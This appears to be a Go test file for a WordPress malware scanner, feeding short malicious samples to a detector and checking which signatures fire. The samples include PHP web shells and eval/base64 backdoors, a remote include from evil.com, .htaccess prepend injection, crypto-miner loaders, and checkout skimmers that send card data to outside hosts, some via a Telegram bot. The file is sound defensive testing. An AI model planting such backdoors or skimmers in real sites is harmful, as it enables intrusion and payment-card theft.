package wordpress

import (
	"context"
	"strings"
	"testing"

	"github.com/IvanShishkin/houndoom/internal/signatures"
	"github.com/IvanShishkin/houndoom/pkg/models"
)

// newTestDetector loads the real YAML signature database so tests exercise the
// actual signatures (not an empty matcher). This catches broken regexes and
// validates the full detection pipeline.
func newTestDetector(t *testing.T, level models.SignatureLevel) *WordPressDetector {
	t.Helper()
	loader := signatures.NewLoader("../../../../configs/signatures")
	db, err := loader.Load()
	if err != nil {
		t.Fatalf("failed to load signatures: %v", err)
	}
	if len(db.Signatures) == 0 {
		t.Fatal("no signatures loaded from configs/signatures")
	}
	matcher := signatures.NewMatcher(db)
	return NewWordPressDetector(matcher, level)
}

func hasSignatureID(findings []*models.Finding, sigID string) bool {
	for _, f := range findings {
		if f.SignatureID == sigID {
			return true
		}
	}
	return false
}

func findingBySig(findings []*models.Finding, sigID string) *models.Finding {
	for _, f := range findings {
		if f.SignatureID == sigID {
			return f
		}
	}
	return nil
}

func makeFile(path, ext, content string) *models.File {
	name := path
	if idx := strings.LastIndex(path, "/"); idx >= 0 {
		name = path[idx+1:]
	}
	return &models.File{
		Path:      path,
		Name:      name,
		Extension: ext,
		Content:   []byte(content),
	}
}

func detect(t *testing.T, d *WordPressDetector, file *models.File) []*models.Finding {
	t.Helper()
	f, err := d.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}
	return f
}

// =====================================================================
// Category 1: backdoors & web shells (YAML-driven)
// =====================================================================

func TestBackdoors_FakeWPFile(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)

	tests := []struct {
		name      string
		path      string
		expectHit bool
	}{
		{"fake wp-xmlrpc.php", "/var/www/html/wp-xmlrpc.php", true},
		{"fake wp-cron-jobs.php", "/var/www/html/wp-cron-jobs.php", true},
		{"fake wp-vcd.php", "/var/www/html/wp-vcd.php", true},
		{"legitimate xmlrpc.php", "/var/www/html/xmlrpc.php", false},
		{"legitimate wp-cron.php", "/var/www/html/wp-cron.php", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := makeFile(tt.path, "php", `<?php eval(base64_decode("x")); ?>`)
			f := detect(t, d, file)
			// Path-based fake-file finding is WP-STRUCTURE-005.
			got := hasSignatureID(f, "WP-STRUCTURE-005") || hasSignatureID(f, "WP-STRUCTURE-004")
			if got != tt.expectHit {
				t.Errorf("fake-file hit=%v want %v (findings: %v)", got, tt.expectHit, sigIDs(f))
			}
		})
	}
}

func TestBackdoors_EvalObfuscation(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)

	tests := []struct {
		name     string
		content  string
		expectSig string
	}{
		{"eval base64", `<?php eval(base64_decode("ZXZhbA==")); ?>`, "WP-BACKDOOR-004"},
		{"eval gzinflate base64", `<?php eval(gzinflate(base64_decode("s0k"))); ?>`, "WP-BACKDOOR-012"},
		{"eval gzinflate str_rot13 base64", `<?php eval(gzinflate(str_rot13(base64_decode("x")))); ?>`, "WP-BACKDOOR-017"},
		{"eval cookie", `<?php eval($_COOKIE['cmd']); ?>`, "WP-BACKDOOR-008"},
		{"assert cookie", `<?php assert($_COOKIE['cmd']); ?>`, "WP-BACKDOOR-018"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/functions.php", "php", tt.content))
			if !hasSignatureID(f, tt.expectSig) {
				t.Errorf("expected %s, got %v", tt.expectSig, sigIDs(f))
			}
		})
	}
}

func TestBackdoors_RemoteInclusion(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-config.php", "php", `<?php include("https://evil.com/shell.php"); ?>`))
	if !hasSignatureID(f, "WP-BACKDOOR-005") {
		t.Errorf("expected WP-BACKDOOR-005, got %v", sigIDs(f))
	}
}

func TestBackdoors_FakePlugin(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)

	shellPlugin := `<?php
/*
Plugin Name: WP Helper
Description: Helps
*/
system($_GET['cmd']);
?>`
	evalPlugin := `<?php
/*
Plugin Name: WP Helper
*/
eval($_POST['code']);
?>`

	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/wp-helper/wp-helper.php", "php", shellPlugin))
	if !hasSignatureID(f, "WP-BACKDOOR-007") {
		t.Errorf("shell plugin: expected WP-BACKDOOR-007, got %v", sigIDs(f))
	}

	f = detect(t, d, makeFile("/var/www/html/wp-content/plugins/wp-helper/wp-helper.php", "php", evalPlugin))
	if !hasSignatureID(f, "WP-BACKDOOR-011") {
		t.Errorf("eval plugin: expected WP-BACKDOOR-011, got %v", sigIDs(f))
	}
}

func TestBackdoors_KnownShells(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	tests := []struct {
		name, content, sig string
	}{
		{"filesman", `<?php if($_COOKIE['FilesMan']) eval(base64_decode($_POST['x'])); ?>`, "WP-BACKDOOR-014"},
		{"WSO", `<?php WSOsetcookie(); $auth_pass=md5('x'); ?>`, "WP-BACKDOOR-015"},
		{"Sniper", `<?php // Shell by Snip3r ?>`, "WP-BACKDOOR-023"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/x.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestBackdoors_DBLoader(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/functions.php", "php", `<?php eval(get_option('my_payload')); ?>`))
	if !hasSignatureID(f, "WP-BACKDOOR-019") {
		t.Errorf("expected WP-BACKDOOR-019, got %v", sigIDs(f))
	}
}

func TestBackdoors_Deserialization(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	tests := []struct {
		name, content, sig string
	}{
		{"maybe_unserialize input", `<?php $d = maybe_unserialize($_POST['data']); ?>`, "WP-BACKDOOR-020"},
		{"unserialize input", `<?php $d = unserialize($_COOKIE['obj']); ?>`, "WP-BACKDOOR-021"},
		{"phar", `<?php if(file_exists('phar://uploaded/evil.phar')) {} ?>`, "WP-BACKDOOR-022"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

// =====================================================================
// Category 2: dangerous API usage (vulnerability patterns)
// =====================================================================

func TestVulns_SQLi(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{"query GET", `<?php $wpdb->query("DELETE FROM wp_users WHERE id=" . $_GET['id']); ?>`, "WP-SQLI-001"},
		{"query concat", `<?php $wpdb->query("DELETE FROM wp_users WHERE id=" . $id); ?>`, "WP-SQLI-002"},
		{"get_results concat", `<?php $wpdb->get_results("SELECT * FROM t WHERE n=" . $n); ?>`, "WP-SQLI-003"},
		{"get_var concat", `<?php $wpdb->get_var("SELECT name FROM t WHERE id=" . $id); ?>`, "WP-SQLI-004"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestVulns_SQLi_SafePrepareNotFlagged(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	content := `<?php $wpdb->query($wpdb->prepare("DELETE FROM wp_users WHERE id = %d", $id)); ?>`
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", content))
	if hasSignatureID(f, "WP-SQLI-001") || hasSignatureID(f, "WP-SQLI-002") {
		t.Errorf("safe prepare should not be flagged, got %v", sigIDs(f))
	}
}

func TestVulns_SSRF(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{"wp_remote_get", `<?php $r = wp_remote_get($_POST['url']); ?>`, "WP-SSRF-001"},
		{"wp_remote_post", `<?php $r = wp_remote_post($_GET['url']); ?>`, "WP-SSRF-002"},
		{"wp_safe_remote_get", `<?php $r = wp_safe_remote_get($_POST['url']); ?>`, "WP-SSRF-003"},
		{"download_url", `<?php $tmp = download_url($_POST['file']); ?>`, "WP-SSRF-004"},
		{"curl URL", `<?php curl_setopt($c, CURLOPT_URL, $_POST['url']); ?>`, "WP-SSRF-005"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestVulns_OptionAndDynamicCall(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{"update_option input", `<?php update_option('opt', $_POST['v']); ?>`, "WP-VULN-001"},
		{"call_user_func input", `<?php call_user_func($_GET['fn']); ?>`, "WP-VULN-003"},
		{"default_role admin", `<?php update_option('default_role', 'administrator'); ?>`, "WP-OPT-001"},
		{"users_can_register", `<?php update_option('users_can_register', 1); ?>`, "WP-OPT-002"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

// =====================================================================
// Category 3: auth & privilege escalation
// =====================================================================

func TestAuthBypass(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{"auth cookie", `<?php wp_set_auth_cookie($uid, true); ?>`, "WP-AUTH-001"},
		{"insert admin", `<?php wp_insert_user(array('role' => 'administrator', 'user_login' => 'a')); ?>`, "WP-AUTH-002"},
		{"add_cap", `<?php $u->add_cap('manage_options'); ?>`, "WP-AUTH-003"},
		{"set_role admin", `<?php $u->set_role('administrator'); ?>`, "WP-AUTH-004"},
		{"add_role admin", `<?php $u->add_role('administrator'); ?>`, "WP-AUTH-006"},
		{"grant_super_admin", `<?php grant_super_admin($uid); ?>`, "WP-AUTH-007"},
		{"wp_set_current_user", `<?php wp_set_current_user($uid); ?>`, "WP-AUTH-008"},
		{"capabilities meta", `<?php update_user_meta($uid, 'wp_capabilities', array('administrator'=>1)); ?>`, "WP-AUTH-009"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/evil/evil.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestAuthBypass_NotAtBasicLevel(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/evil/evil.php", "php", `<?php wp_set_auth_cookie($uid, true); ?>`))
	if hasSignatureID(f, "WP-AUTH-001") {
		t.Error("AUTH sigs are level 1; should not fire at LevelBasic")
	}
}

// =====================================================================
// Category 4: REST API & cron abuse
// =====================================================================

func TestRESTAndCron(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{
			"unauth REST route",
			`<?php register_rest_route('my/v1', '/x', array('permission_callback' => '__return_true')); ?>`,
			"WP-REST-001",
		},
		{
			"REST with eval sink",
			`<?php register_rest_route('my/v1','/x',array('callback'=>function($r){ eval($_POST['c']); })); ?>`,
			"WP-REST-002",
		},
		{
			"cron RCE with input",
			`<?php wp_schedule_single_event(time(), 'my_hook', array($_POST['payload'])); ?>`,
			"WP-CRON-001",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

// =====================================================================
// Category 5: malicious hooks & filters
// =====================================================================

func TestMaliciousHooks(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, sig string
	}{
		{
			"init eval",
			`<?php add_action('init', function() { eval($_POST['x']); }); ?>`,
			"WP-HOOK-001",
		},
		{
			"wp_head base64",
			`<?php add_action('wp_head', function() { echo base64_decode("PHNjcmlwdD4="); }); ?>`,
			"WP-HOOK-002",
		},
		{
			"the_content script",
			`<?php add_filter('the_content', function($c) { return $c . '<script src="https://evil.com/x.js"></script>'; }); ?>`,
			"WP-HOOK-003",
		},
		{
			"wp_footer base64",
			`<?php add_action('wp_footer', function() { echo base64_decode("eA=="); }); ?>`,
			"WP-HOOK-006",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestHooks_GenericInitNotFlaggedAsRCE(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	content := `<?php add_action('init', function() { register_post_type('book'); }); ?>`
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/main.php", "php", content))
	if hasSignatureID(f, "WP-HOOK-001") {
		t.Error("benign init hook must not trigger WP-HOOK-001")
	}
}

// =====================================================================
// Category 6: structure anomalies (path-based, in detector)
// =====================================================================

func TestStructure_PHPInUploads(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-content/uploads/2024/01/shell.php", "php", `<?php echo "x"; ?>`))
	if !hasSignatureID(f, "WP-STRUCTURE-001") {
		t.Errorf("expected WP-STRUCTURE-001, got %v", sigIDs(f))
	}
	// image in uploads must NOT trigger
	f = detect(t, d, makeFile("/var/www/html/wp-content/uploads/2024/01/photo.jpg", "jpg", "binary"))
	if hasSignatureID(f, "WP-STRUCTURE-001") {
		t.Error("jpg in uploads should not trigger WP-STRUCTURE-001")
	}
}

func TestStructure_HiddenPHPInThemePlugin(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	for _, p := range []string{
		"/var/www/html/wp-content/themes/t/.backdoor.php",
		"/var/www/html/wp-content/plugins/p/.hidden.php",
	} {
		f := detect(t, d, makeFile(p, "php", `<?php system($_GET['x']); ?>`))
		if !hasSignatureID(f, "WP-STRUCTURE-003") {
			t.Errorf("%s: expected WP-STRUCTURE-003, got %v", p, sigIDs(f))
		}
	}
	// non-hidden theme file must NOT trigger hidden check
	f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/functions.php", "php", `<?php // normal`))
	if hasSignatureID(f, "WP-STRUCTURE-003") {
		t.Error("functions.php must not trigger WP-STRUCTURE-003")
	}
}

func TestStructure_FakeCoreInIncludes(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-includes/wp-vcd.php", "php", `<?php // malware`))
	if !hasSignatureID(f, "WP-STRUCTURE-004") {
		t.Errorf("expected WP-STRUCTURE-004, got %v", sigIDs(f))
	}
}

func TestStructure_HtaccessInjection(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	tests := []struct {
		name, path, content string
		expectCritical bool
	}{
		{
			"auto_prepend in wp-admin",
			"/var/www/html/wp-admin/.htaccess",
			"php_value auto_prepend_file /tmp/evil.php",
			true,
		},
		{
			"SetHandler php in root",
			"/var/www/html/.htaccess",
			"SetHandler application/x-httpd-php",
			false,
		},
		{
			"normal root htaccess",
			"/var/www/html/.htaccess",
			"RewriteEngine On\nRewriteBase /",
			false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile(tt.path, "htaccess", tt.content))
			wd := findingBySig(f, "WP-STRUCTURE-002")
			if tt.content == "RewriteEngine On\nRewriteBase /" {
				if wd != nil {
					t.Errorf("normal .htaccess should not trigger, got %v", sigIDs(f))
				}
				return
			}
			if wd == nil {
				t.Fatalf("expected WP-STRUCTURE-002, got %v", sigIDs(f))
			}
			if tt.expectCritical && wd.Severity != models.SeverityCritical {
				t.Errorf("protected dir: want critical, got %s", wd.Severity)
			}
		})
	}
}

func TestStructure_UserIniPrepend(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/.user.ini", "ini", "auto_prepend_file=/tmp/evil.php"))
	if !hasSignatureID(f, "WP-STRUCTURE-008") {
		t.Errorf("expected WP-STRUCTURE-008, got %v", sigIDs(f))
	}
}

func TestStructure_MUPluginsPersistence(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)

	// shell code in mu-plugins without Plugin Name header
	f := detect(t, d, makeFile("/var/www/html/wp-content/mu-plugins/0.php", "php", `<?php eval($_POST['x']); ?>`))
	if !hasSignatureID(f, "WP-STRUCTURE-006") {
		t.Errorf("expected WP-STRUCTURE-006 (mu shell no header), got %v", sigIDs(f))
	}

	// core-name mimic inside mu-plugins
	f = detect(t, d, makeFile("/var/www/html/wp-content/mu-plugins/wp-cron.php", "php", `<?php // x`))
	if !hasSignatureID(f, "WP-STRUCTURE-007") {
		t.Errorf("expected WP-STRUCTURE-007 (mu core mimic), got %v", sigIDs(f))
	}

	// legit mu dropin WITH header should not trigger 006
	f = detect(t, d, makeFile("/var/www/html/wp-content/mu-plugins/health-check-disable-plugins.php", "php", `<?php /* Plugin Name: Health Check */ function hc_disable() {} ?>`))
	if hasSignatureID(f, "WP-STRUCTURE-006") {
		t.Errorf("legit dropin with header must not trigger WP-STRUCTURE-006, got %v", sigIDs(f))
	}
}

// =====================================================================
// Category 7: modern malware families (Balada, SocGholish, miners, skimmers)
// =====================================================================

func TestMalware_Balada(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, ext, sig string
	}{
		{
			"loader",
			`document.head.appendChild(document.createElement('script')).src='https://b.thecarboncritic.com/x.js?h=1';`,
			"js", "WP-MALWARE-016",
		},
		{
			"domain marker",
			`var u='https://b.reecengine.com/p';`,
			"js", "WP-MALWARE-018",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/assets/main.js", tt.ext, tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestMalware_SocGholish(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	f := detect(t, d, makeFile("/var/www/html/wp-content/uploads/2024/01/update.js", "js", `window['_cygnus_opts']={};`))
	if !hasSignatureID(f, "WP-MALWARE-019") {
		t.Errorf("expected WP-MALWARE-019, got %v", sigIDs(f))
	}
}

func TestMalware_ModernMiners(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, ext, sig string
	}{
		{
			"WASM miner",
			`WebAssembly.instantiateStreaming(fetch('/x.wasm')).then(m => mineMonero(m));`,
			"js", "WP-MALWARE-021",
		},
		{
			"websocket pool",
			`new WebSocket('wss://gulf.moneroocean.stream:443/xmr');`,
			"js", "WP-MALWARE-023",
		},
		{
			"active domain",
			`<script src="https://www.coinimp.com/lib/min.js"></script>`,
			"html", "WP-MALWARE-024",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/a."+tt.ext, tt.ext, tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestMalware_ModernSkimmers(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	tests := []struct {
		name, content, ext, sig string
	}{
		{
			"woo checkout skimmer",
			`jQuery('form.checkout').on('checkout_place_order', function(){ fetch('https://e.co',{method:'POST',body:card}); });`,
			"js", "WP-MALWARE-025",
		},
		{
			"stripe frame theft",
			`var f = document.querySelector('iframe[name*="__privateStripeFrame"]');`,
			"js", "WP-MALWARE-026",
		},
		{
			"card field harvest",
			`var c = document.querySelector('input[name="cardnumber"]');`,
			"js", "WP-MALWARE-027",
		},
		{
			"telegram exfil",
			`fetch('https://api.telegram.org/bot123/sendMessage', {method:'POST', body: JSON.stringify(d)});`,
			"js", "WP-MALWARE-028",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/p/checkout.js", "js", tt.content))
			if !hasSignatureID(f, tt.sig) {
				t.Errorf("expected %s, got %v", tt.sig, sigIDs(f))
			}
		})
	}
}

func TestMalware_WPVCDFamily(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-content/themes/t/functions.php", "php", `<?php if(!defined('WP_CD_CODE')) define('WP_CD_CODE', true); ?>`))
	if !hasSignatureID(f, "WP-MALWARE-001") {
		t.Errorf("expected WP-MALWARE-001, got %v", sigIDs(f))
	}
}

// =====================================================================
// Suppression layer (false-positive reduction)
// =====================================================================

func TestSuppression_CoreFile(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)

	// wp-includes/pluggable.php legitimately calls wp_set_auth_cookie()
	f := detect(t, d, makeFile("/var/www/html/wp-includes/pluggable.php", "php",
		`<?php function wp_set_auth_cookie($user_id) { setcookie(AUTH_COOKIE, $user_id); } ?>`))
	if hasSignatureID(f, "WP-AUTH-001") {
		t.Error("core file must suppress WP-AUTH-001 (legitimate auth API usage)")
	}

	// But core still scanned for actual backdoors
	f = detect(t, d, makeFile("/var/www/html/wp-includes/pluggable.php", "php",
		`<?php eval(base64_decode($_POST['x'])); ?>`))
	if !hasSignatureID(f, "WP-BACKDOOR-004") {
		t.Error("core file must still be scanned for backdoors, got: "+strings.Join(sigIDs(f), ","))
	}
}

func TestSuppression_SecurityPlugin(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	// Wordfence scanner file contains detection patterns
	content := `<?php // detection: eval(base64_decode, wp_set_auth_cookie, $wpdb->query($_GET['id']`
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/wordfence/lib/scanner.php", "php", content))
	for _, id := range []string{"WP-BACKDOOR-004", "WP-AUTH-001", "WP-SQLI-001"} {
		if hasSignatureID(f, id) {
			t.Errorf("security plugin must suppress %s", id)
		}
	}
}

func TestSuppression_ManagedPlugin(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)

	// WooCommerce legitimately calls wp_set_auth_cookie during login
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/woocommerce/includes/class-wc-form-login.php", "php",
		`<?php wp_set_auth_cookie($user_id, true); ?>`))
	if hasSignatureID(f, "WP-AUTH-001") {
		t.Error("managed plugin (WooCommerce) must suppress WP-AUTH-001")
	}

	// But a real backdoor inside a managed plugin must still be detected
	f = detect(t, d, makeFile("/var/www/html/wp-content/plugins/woocommerce/includes/evil.php", "php",
		`<?php eval(base64_decode($_POST['x'])); ?>`))
	if !hasSignatureID(f, "WP-BACKDOOR-004") {
		t.Error("managed plugin must still detect backdoors, got: "+strings.Join(sigIDs(f), ","))
	}
}

// =====================================================================
// Finding quality / metadata
// =====================================================================

func TestFindingMetadata(t *testing.T) {
	d := newTestDetector(t, models.LevelBasic)
	f := detect(t, d, makeFile("/var/www/html/wp-content/uploads/2024/01/shell.php", "php", `<?php eval(base64_decode("x")); ?>`))
	if len(f) == 0 {
		t.Fatal("expected findings")
	}
	for _, fd := range f {
		if fd.RiskScore == nil {
			t.Errorf("%s: nil RiskScore", fd.SignatureID)
		}
		if fd.Metadata == nil {
			t.Errorf("%s: nil Metadata", fd.SignatureID)
		}
		if fd.Metadata["cms"] != "wordpress" {
			t.Errorf("%s: missing cms=wordpress", fd.SignatureID)
		}
		if fd.Timestamp.IsZero() {
			t.Errorf("%s: zero timestamp", fd.SignatureID)
		}
	}
}

func TestNoDuplicateSignatureIDs(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	// A file hitting multiple sigs must not produce two findings with the same ID.
	content := `<?php
Plugin Name: Evil
eval(base64_decode($_POST['x']));
$wpdb->query("DELETE FROM t WHERE id=" . $_GET['id']);
wp_set_auth_cookie(1, true);
`
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/evil/evil.php", "php", content))
	seen := make(map[string]int)
	for _, fd := range f {
		seen[fd.SignatureID]++
	}
	for id, n := range seen {
		if n > 1 {
			t.Errorf("signature %s reported %d times (must be deduplicated)", id, n)
		}
	}
}

func TestCombinedDetection_MaliciousFile(t *testing.T) {
	d := newTestDetector(t, models.LevelExpert)
	content := `<?php
/*
Plugin Name: WP Helper
*/
eval(base64_decode($_POST['cmd']));
$wpdb->query("DELETE FROM wp_users WHERE id=" . $_GET['id']);
wp_set_auth_cookie(1, true);
if(!defined('WP_CD_CODE')) define('WP_CD_CODE', true);
header("Location: https://evil.tk/redir");
`
	f := detect(t, d, makeFile("/var/www/html/wp-content/plugins/wp-helper/wp-helper.php", "php", content))
	if len(f) < 4 {
		t.Fatalf("expected >=4 findings for malicious file, got %d: %v", len(f), sigIDs(f))
	}
	hasCritical := false
	for _, fd := range f {
		if fd.Severity == models.SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected at least one critical finding")
	}
}

// =====================================================================
// Helpers
// =====================================================================

func sigIDs(findings []*models.Finding) []string {
	out := make([]string, 0, len(findings))
	for _, f := range findings {
		out = append(out, f.SignatureID)
	}
	return out
}
